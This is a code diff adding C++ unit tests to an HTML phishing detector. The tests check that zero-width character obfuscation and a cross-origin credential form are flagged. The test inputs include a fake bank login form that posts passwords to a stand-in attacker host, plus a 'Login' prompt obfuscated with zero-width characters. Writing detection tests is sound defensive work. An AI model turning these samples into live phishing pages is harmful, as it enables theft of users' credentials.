@@ -21,6 +21,28 @@ public:
 
 private:
 };
+
+/*
+* 
+*/
+TEST(ScanTest, ZeroObuse)
+{
+    CHtmlParser parser;
+    CHtmlAnalyzer analyzer;
+    parser.SetHandler(&analyzer);
+
+    std::string maliciousHtml = // made by Gemini
+        "<html><body>"
+        "<input type=\"text\" value=\"Please L\xE2\x80\x8Bog\xE2\x80\x8Bin to continue\">"
+        "</body></html>";
+
+    parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());
+
+    EXPECT_TRUE(analyzer.isPhishingPattern());
+    std::string report = analyzer.getDetectionReport();
+    EXPECT_NE(report.find("[H001] Zero-Width Character Obfuscation Detected"), std::string::npos);
+}
+
 /*
 TEST(ScanTest, Randsomeware)
 {
@@ -171,4 +193,28 @@ TEST(ScanTest, EvasionMetaDataURI)
     EXPECT_TRUE(analyzer.isPhishingPattern());
     std::string report = analyzer.getDetectionReport();
     EXPECT_NE(report.find("[H102] Meta Refresh Data URI Detected"), std::string::npos);
+}
+
+TEST(ScanTest, CrossOriginPost)
+{
+    CHtmlParser parser;
+    CHtmlAnalyzer analyzer;
+    parser.SetHandler(&analyzer);
+
+    // made by Gemini
+    analyzer.SetCurrentUrl("http://www.bank-secure.com/login.html");
+
+    std::string maliciousHtml = 
+        "<html><body>"
+        "<form action=\"https://www.attacker-site.com/collect.php\" method=\"POST\">"
+        "   Password: <input type=\"password\" name=\"passwd\">"
+        "   <input type=\"submit\" value=\"Login\">"
+        "</form>"
+        "</body></html>";
+
+	parser.Parse(maliciousHtml.c_str(), maliciousHtml.length());
+
+	EXPECT_TRUE(analyzer.isPhishingPattern());
+    std::string report = analyzer.getDetectionReport();
+	EXPECT_NE(report.find("[H103] Cross-Origin Form POST Detected"), std::string::npos);
 }
